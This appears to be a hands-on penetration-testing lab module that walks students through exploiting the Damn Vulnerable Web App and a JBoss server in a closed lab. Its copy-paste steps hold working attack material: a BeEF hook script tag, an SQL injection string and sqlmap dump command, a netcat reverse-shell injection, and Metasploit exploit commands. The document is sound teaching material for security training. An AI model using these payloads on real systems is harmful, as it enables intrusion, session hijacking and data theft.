---
title: Web Applications
layout: module
---

# Hacking Web Applications

### Goals

-   Successfully exploit the [Damn Vulnerable Web App
    (DVWA)](http://www.dvwa.co.uk/) with [Cross-Site Scripting
    (XSS)](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS))

-   Leverage this XSS and take control of a users\' browser with
    the [Browser Exploitation Framework
    (BeEF)](http://beefproject.com/)

-   Successfully exploit an [SQL
    Injection](https://www.owasp.org/index.php/Top_10_2013-A1-Injection) in
    the DVWA to enumerate users on the app

-   Use [SQLMap](http://sqlmap.org/) to assist in the
    exploitation and exfiltration of SQL Injection errors.

-   Practice exploiting an [OS command
    injection](https://www.owasp.org/index.php/Command_Injection) vulnerability
    to create a [reverse
    shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

-   Use the [Metasploit
    Framework](https://community.rapid7.com/community/metasploit) to
    assess a JBoss install for vulnerabilities, then exploit JBoss using
    the Meterpreter plugin

## Exercise 1: Prerequisites

### Task 1

Start BurpSuite.

-   This can be found in Applications **Menu \> 03 - Web Application
    Analysis**
-   Choose Temporary project, Click **Next**
-   Choose Use Burp defaults, Click **Start Burp**
-   Click on the **Proxy tab**, then **Intercept**
-   Make sure Intercept is **Off**.

### Task 2

Set Firefox to use BurpSuite as a proxy and disable captive portal
detection

-   Using Firefox on Kali, browse to **about:config**.
-   Choose **I Accept the Risk**. Search for captive. Set
    network.captive-portal-service.enabled to false.
-   Proxy settings can be found in O**pen Menu → Preferences → Advanced
    → Network → Configure how Firefox connects to the Internet →
    Settings**\...
-   Select Manual proxy configuration and make sure HTTP Proxy is set to
    **localhost** and port **8080**
-   Using Firefox, browse to <http://metasploitable/dvwa> .
-   You should see the request show up in BurpSuite under **HTTP
    History**
-   What version of Apache is the server running?

### Task 3

Log in as ***smithy*** / ***password***

### Task 4

The security level is displayed at the bottom of the page

-   Change the Security Level of DVWA to **Low**. This can be found in
    ***DVWA Security***.

-   You\'ll need to do this if you log out and log back in, or log in
    from another host

### Task 5

Start the beef-xss service:

{% capture code %}
service beef-xss start
{% endcapture %}
{% include copy-paste.html title="BeeF" code=code %}

### Task 6

Make sure you can reach the BeEF UI authentication page at
<http://localhost:3000/ui/authentication> 

> Note: By default, requests to localhost will not be sent to BurpSuite
> with the default proxy settings.

Log in as ***beef*** / ***beef*** .

## Exercise 2 : Cross Site Scripting

### Task 1

-   In a new tab, navigate to **XSS Reflected**. You can view the PHP
    source code by clicking the **View Source** button at the bottom of
    the page.
-   Try placing your name in the **Textbox** and click **Submit**
-   From looking at **BurpSuite**, how was your name sent to the server?
-   Trigger a reflected **XSS alert** and print out the current document
    cookie
-   Use the Web Developer Tools to help you navigate the DOM (**Tools →
    Web Developer → Inspector**)
-   You can also use the Web Console to view a value in the DOM

### Task 2

Navigate to XSS Stored. Figure out a way to insert a BeEF Hook. You can
paste in your web browser using **\[Control+V\]**:

{% capture code %}
`<script src="http://192.168.1.2:3000/hook.js" type="text/javascript"></script>`
{% endcapture %}
{% include copy-paste.html title="XSS Stored" code=code %}

> Note: Use the developer tools to modify the maxlength attribute in the
> textarea tag, or use BurpSuite to intercept and modify the POST
> message parameters.

### Task 3

Open your Windows desktop and use Firefox to go to DVWA, log in
as admin / password

-   Go to XSS Stored
-   From the BeEF UI, see if the Windows browser is hooked. If not,
    figure out why not

### Task 4

Type your name and a message from Windows in the message and store it

-   What version of Firefox is running on the hooked Windows Browser?
-   What is the size of the screen?
-   See if you can see the characters that were entered in Windows from
    the Beef UI. You may need to refresh the log[]{#line-66}
-   Create a prompt dialog with the message of your choice. (Commands →
    Browser → Hooked Domain)
-   Finally, get the hooked browser\'s cookie.

**Bonus**: Use the stolen cookie to access the DVWA as admin.

### Task 5

To keep BeEF from interfering with later labs, release all hooked
browsers

-   Reset the DVWA RDMS Database from Setup
-   Log back in as admin
-   Close the Remote Desktop for `windows`

## Exercise 3 : SQL Injection

### Task 1

Navigate to **SQL Injection**. Enumerate users on the system with an SQL
injection.

{% capture text %}
<pre>
    a' or 'a' = 'a
</pre>
{% endcapture %}
{% include cheat.html text=text %}

### Task 2

Use SQLMap to dump the database

-   You\'ll need to copy your cookie from the browser
-   What RDMS is the target using?
-   Skip test payloads for other RDMSes
-   Which parameter is injectable?
-   What is Pablo Picasso\'s password?

{% capture code %}
    sqlmap --cookie="<cookie>" --url="http://metasploitable/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --string="surname" --dump
{% endcapture %}
{% include copy-paste.html title="SQLMap" code=code %}

## Exercise 4 : Command Injection

### Task 1

Navigate to **Command Execution**. Inject the command `id`

-   **\<star-wars-reference\> Use the source Luke!
    \</star-wars-reference\>**
-   **nano-Hint**: If ping returns an error, you won\'t see anything.
-   What user is PHP running as?

### Task 2

Spawn a [reverse
shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) using
Netcat.

### Task 2a

Start a listener using netcat from Kali:

{% capture code %}
nc -v -l -p 4444
{% endcapture %}
{% include copy-paste.html title="Create a listener" code=code %}

### Task 2b

Inject this command: `localhost && nc -e /bin/bash kali 4444`

-   This will start netcat on the remote host and connect back to you
    with a shell
-   It\'s normal not to have a prompt \-- type commands as you normally
    would anyway

### Task 3

What is the uptime of the system?

## Exercise 5 : Intro to Exploits Using Metasploit Against JBoss

### Task 1

**Shut down BurpSuite**. It uses port 8080 which will conflict with
JBoss

-   You may also need to reboot: `reboot`

### Task 2

Run JBoss:

{% capture code %}
      cd ~/labs/web-apps

      ./run-jboss.sh
{% endcapture %}
{% include copy-paste.html title="Run JBoss" code=code %}

### Task 3

Using Firefox, check that you can connect to JBoss at
[http://localhost:8080](http://localhost:8080/)

### Task 4

Using Metasploit, run the **jboss_vulnscan** plugin:

{% capture code %}
	use auxiliary/scanner/http/jboss_vulnscan
{% endcapture %}
{% include copy-paste.html title="Use the auxiliary/scanner/http/jboss_vulnscan module" code=code %}

{% capture code %}
	info
{% endcapture %}
{% include copy-paste.html title="Use info to obtain more information about the module" code=code %}

{% capture code %}
	set RHOSTS 127.0.0.1
{% endcapture %}
{% include copy-paste.html title="Set the Remote Host (RHOST)" code=code %}

{% capture code %}
	set RPORT 8080
{% endcapture %}
{% include copy-paste.html title="Set the Remote Port (RPORT)" code=code %}

{% capture code %}
	exploit
{% endcapture %}
{% include copy-paste.html title="Start the exploit" code=code %}

### Task 5

Run Meterpreter through the jboss_invoke_deploy exploit:

{% capture code %}
	use exploit/multi/http/jboss_invoke_deploy

	info

	set RHOST 127.0.0.1

	set RPORT 8080

	set LHOST 127.0.0.1

	set LPORT 5555

	exploit -t 1
{% endcapture %}
{% include copy-paste.html title="Similar procedure as the one you just learned, but in this case invoking Meterpreter." code=code %}

### Task 6

List the running processes on the victim.

-   Use `help`
-   What other commands look interesting? Try some of them out!
